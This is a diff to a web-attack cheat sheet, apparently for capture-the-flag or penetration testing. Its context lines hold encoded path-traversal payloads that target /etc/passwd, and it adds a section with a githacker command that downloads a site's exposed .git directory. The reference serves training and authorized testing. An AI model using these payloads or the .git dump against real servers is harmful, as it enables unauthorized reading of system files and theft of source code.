@@ -1,6 +1,7 @@
 # 🕸️ Web
 
 - [BruteForce](#bruteforce)
+- [Download .git](#download-.git)
 - [Influx DB](#influx-db)
 - [Mysql](#mysql)
 - [Path traversal](#path-traversal)
@@ -160,3 +161,9 @@ print(r.status_code, r.url)
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 %252e%252e%252e%252e%252e%252fetc%252fpasswd%00
 ```
+
+## Download .git
+```
+githacker --url http://url/.git/ --folder result
+```
+[Source](https://github.com/WangYihang/GitHacker)
